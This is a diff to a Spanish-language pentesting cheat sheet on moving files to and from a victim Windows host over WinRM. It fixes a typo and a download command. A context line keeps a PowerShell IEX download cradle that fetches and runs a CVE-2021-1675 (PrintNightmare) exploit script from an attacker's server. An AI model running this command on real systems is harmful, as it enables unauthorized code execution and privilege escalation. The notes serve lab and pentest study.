@@ -45,8 +45,8 @@ C:\Windows\Temp
 
 ```bash
 # Si tenemos una sesion con WinRM, podemos usar el siguiente comando en la maquina victima sin necesidad de crear un recurso compartido en nuestra maquina de atacante 
-❯ upload /ruta/abosluta/maquina/atacante/file.exe 
-❯ download /ruta/abosluta/maquina/atacante/file.exe      # Pasar el archivo desde la maquina Windows a Linux con WinRM
+❯ upload /ruta/absoluta/maquina/atacante/file.exe 
+❯ download C:\dir\file.zip  file.zip          # Pasar el archivo desde la maquina Windows a Linux con WinRM
 
 ❯ IEX(New-Object Net.WebClient).downloadString(‘http://<IP>/CVE-2021-1675.ps1’)  # Con este comando en la maquina victima podemos subir el script en powershell que esta cargado en nuestro servidor, colocando la IP de atacante y el script .ps1
 ```
